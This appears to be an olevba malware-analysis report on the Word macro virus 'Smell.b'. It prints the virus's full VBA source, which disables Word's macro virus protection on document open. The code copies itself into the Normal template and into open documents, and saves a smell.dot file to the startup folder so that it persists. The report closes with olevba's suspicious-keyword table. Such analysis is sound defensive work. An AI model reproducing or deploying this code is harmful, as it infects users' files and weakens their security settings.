olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Smell.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Smell.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WhoAmI As String
Public SmellDot As Boolean
Public NormInstalled As Boolean
Public DocInstalled As Boolean
Public NormReadOnly As Boolean
Public DocThere As Boolean

Private Sub Document_Open()
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = 0
Call ID_Status
Call Install_Status
If WhoAmI = "document" Then Call DocCode
If WhoAmI = "normal" Then Call NormCode
If WhoAmI = "smell" Then Call SmellCode
End Sub

Function ID_Status()
On Error Resume Next

If MacroContainer = NormalTemplate Then
    WhoAmI = "normal"
    GoTo checkout
End If
If MacroContainer = ActiveDocument Then WhoAmI = "document"
If MacroContainer = "smell.dot" Then WhoAmI = "smell"
checkout:
End Function

Function Install_Status()
On Error Resume Next
If Dir(Application.StartupPath + "\smell.dot") = "smell.dot" Then SmellDot = True
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Smell" Then DocInstalled = True
    Next i
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "Smell" Then NormInstalled = True
    Next i
If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or _
GetAttr(NormalTemplate.FullName) = vbReadOnly Then NormReadOnly = True
End Function

Function DocCode()
On Error Resume Next
If NormInstalled = False And NormReadOnly = False Then
    NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 100)
End If
If SmellDot = False Then
    ActiveDocument.SaveAs FileName:=Application.StartupPath + "\smell.dot", _
    FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
End If
End Function

Function NormCode()
On Error Resume Next
Call Check_For_Doc
If DocInstalled = False And DocThere = True Then
   ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 100)
   ActiveDocument.Save
End If
If SmellDot = False And DocThere = True Then
   ActiveDocument.SaveAs FileName:=Application.StartupPath + "\smell.dot", _
   FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
End If
End Function

Function Check_For_Doc()
On Error GoTo docek
If ActiveDocument.Name <> "" Then
    DocThere = True
End If
GoTo over
docek:
DocThere = False
over:
End Function

Function SmellCode()
On Error Resume Next
If NormInstalled = False And NormReadOnly = False Then
    NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 100)
    NormalTemplate.Save
End If
If DocInstalled = False Then
    ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 100)
    ActiveDocument.Save
End If
End Function












+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

